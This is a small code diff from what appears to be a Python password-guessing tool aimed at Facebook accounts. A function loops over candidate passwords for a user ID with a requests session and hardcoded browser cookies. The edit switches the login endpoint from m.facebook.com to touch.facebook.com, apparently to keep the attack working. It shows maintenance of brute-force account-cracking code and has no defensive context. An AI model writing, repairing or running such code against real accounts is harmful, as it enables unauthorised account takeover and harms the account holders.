@@ -1249,7 +1249,7 @@ def p(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com').text
+            free_fb = Session.get('https://touch.facebook.com').text
             cookies = {
             'datr': '7DnMaEaBSi1euh0ZrTxnFPXZ',
             'sb': '7DnMaMKotlR75LUbGLYU-TYB',
